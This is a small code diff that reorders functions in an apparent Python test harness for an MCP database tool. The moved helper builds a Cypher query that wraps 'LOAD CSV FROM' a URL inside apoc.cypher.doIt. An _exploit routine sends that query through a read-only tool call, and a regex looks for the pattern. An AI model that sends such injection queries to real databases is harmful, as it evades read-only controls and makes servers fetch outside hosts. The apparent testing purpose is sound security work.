@@ -33,16 +33,16 @@ KEPT_PLACES = tuple(place_id for place_id, _ in ENDPOINTS)
 AIM = re.compile(r"LOAD CSV FROM 'http://")
 
 
-def _exploit_query(url: str) -> str:
-    inner = f"LOAD CSV FROM '{url}' AS row RETURN row"
-    return f'CALL apoc.cypher.doIt("{inner}", {{}}) YIELD value RETURN value'
-
-
 def _exploit(url: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
     async def run(places: Places, client: MCPClientPort) -> None:
         await client.call_tool(READ_TOOL, {"query": _exploit_query(url)})
 
     return run
+
+
+def _exploit_query(url: str) -> str:
+    inner = f"LOAD CSV FROM '{url}' AS row RETURN row"
+    return f'CALL apoc.cypher.doIt("{inner}", {{}}) YIELD value RETURN value'
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
